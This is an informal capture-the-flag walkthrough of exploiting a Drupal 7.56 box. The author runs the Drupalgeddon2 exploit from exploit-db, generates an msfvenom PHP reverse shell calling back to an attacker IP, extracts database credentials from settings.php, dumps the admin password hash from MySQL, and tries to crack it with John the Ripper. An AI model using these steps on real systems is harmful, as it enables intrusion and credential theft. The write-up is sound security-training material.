so we go ahead hit it with our nmap scans
these scans show apache versions, php versions all of which i used searchsploit to look for known vulns and didnt find much
Saw that it identified it was running drupal 7, and exploit is called drupalgeddon...haha hmmm i wonder if this will work

- Trying the exploit code for -> 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User), we get that it doesnt work
- Since we saw changelog in nmap as well as gobuster, lets go there to see the exact versions
- Changelog shows we are running Drupal 7.56

needed to gem install relevant modules for ruby

Ruinning https://www.exploit-db.com/exploits/44449 we get a web shell, go ahead and try to create a reverse shell

We've got some rce, it also looks like this script allows us to upload our own shell, lets try tty shell generated by msfvenom
`~/apps/metasploit-framework/msfvenom -p php/reverse_php LHOST=10.10.14.95 LPORT=6000 -f raw > shell.php`
``

Trying to find some passwords using `grep -rnw './' -e 'password'`
- found: ./modules/simpletest/tests/upgrade/upgrade.user.test:31:    $this->assertEqual('$S$DAK00p3Dkojkf4O/UizYxenguXnjv', $pass, 'Pre-existing non-MD5 password hash was not altered');
- seems like password was either "password" or "CQHEy@9M*m23gBVj" <- for one of them

Printing out the settings.php file gave us some interesting stuff
- $drupal_hash_salt = '4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns';
- ```
  $databases = array (
    'default' => 
    array (
      'default' => 
      array (
        'database' => 'drupal',
        'username' => 'drupaluser',
        'password' => 'CQHEy@9M*m23gBVj',
        'host' => 'localhost',
        'port' => '',
        'driver' => 'mysql',
        'prefix' => '',
      ),
    ),
  );
```

- goina try to use that one for ssh, nope didnt seem like that worked :\
- listing the users seems like the people we do have are:
`less /etc/passwd`
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash

- Tried that password with brucetherealadmin accnt as well didnt work
- Goina go ahead with the mysql server, connect using the built in cli
    - Should also try to do ssh tunneling!
- `mysql --user=drupaluser --password=CQHEy@9M*m23gBVj` doesnt give an error, but also doesnt give me a shell?? i dont think I have a full tty shell so maybe that's why it is acting up
- yup, looking more into it, that was the reason, the shell that i currently have is not able to keep track of the new spawned connection
- using -e will tell mysql to ouput the information
`mysql -e 'show databases' -user=drupaluser -password=CQHEy@9M*m23gBVj`
Database
information_schema
drupal
mysql
performance_schema
we see there is a users database and get this:
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1607077194	16070762761	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}

Its the wierd user we saw earlier! it also has a password associated with it... we also know the salt to the password which we found in the settings page earlier
We will try to use JTR to crack the password
Went ahead and ran JTR while looking how to add that hash we found eariler, turns out I didnt even need it!
using rockyou.txt we get the password -> !!!jim!!!.a6_123
hmm well that password did not work...
seems like jtr might not suppoer this cipher, but somehow found a collision for the one it 'detected' -> got baited pretty hard


Note:
If an exploit doesnt work and its been verified on exploit-db, then should prob look at another avenue or exploit
Dont stay too long on something that isnt working, chances if it isnt working then it might not be the solution
Still need to truly understand tty, pty, dumb shells, bind shells, and everything in between
If something doesnt work -> MOVE ON